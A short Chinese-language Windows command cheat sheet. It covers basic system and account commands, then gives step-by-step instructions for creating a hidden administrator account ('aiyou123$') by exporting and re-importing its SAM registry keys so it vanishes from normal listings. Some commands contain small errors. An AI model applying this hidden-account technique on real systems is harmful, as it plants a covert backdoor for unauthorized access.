一、常用命令

1、查看系统版本：ver

2、查看主机名：hostname

3、查看网络配置：ipconfig/all

4、查看用户：net user

5、查看开放端口：netstat -ano

6、打开注册表：regedit

7、打开时间查看器：eventvwr.msc

8、打开系统服务：services.msc

9、打开组策略编辑器：gpedit.msc

10、打开本地安全策略：secpol.msc

11、打开本地用户和组：lusrmgr.msc

  

二、账号相关命令

1、查看账户aiyou的详细信息：net user aiyou

2、创建空密码账户aiyou：net user aiyou /add

3、删除空密码账户aiyou：net user aiyou /del

4、把aiyou加入管理员组：net localgroup administrator aiyou /add

5、把aiyou删除管理员组：net localgroup administrator aiyou /del

6、启用aiyou账户：net user aiyou /active:yes

7、关闭aiyou账户：net user aiyou /active:no

三、建立隐藏账户

1、添加隐藏账户

net user aiyou123$ aiyou123 /add

2、添加到管理员组

net localgroup administrator test$ /add 

![](../Images/3bdfdb626c58250923e1b78ce3d2393b.png)

3、regedit，打开注册表，展开HKEY\_LOCAL\_MACHINE\\SAM\\SAM ,默认情况下没有内容，右击SAM，权限，进行如下设置

![](../Images/9f195abb539106e878b7f468f6ff1a90.png)

4、重启注册表，打开HKEY\_LOCAL\_MACHINE\\SAM\\SAM\\Domains\\Account\\Users\\Names\\aiyou123$，查看类型为0x3eb

![](../Images/02542932f342a9367cba698a4fbc9c8a.png)

5、打开HKEY\_LOCAL\_MACHINE\\SAM\\SAM\\Domains\\Account\\Users，导出里面的两个注册表

![](../Images/479f81b240f2f3638c42b35ad5ff183d.png)

6、将aiyou123$删除，再次重启注册表

net user aiyou123$ /del

![](../Images/caba6f190b269cc9295a244341b80562.png)

7、再将两个注册表内容重新导入，将导出的两个reg文件重新拖入原来的位置
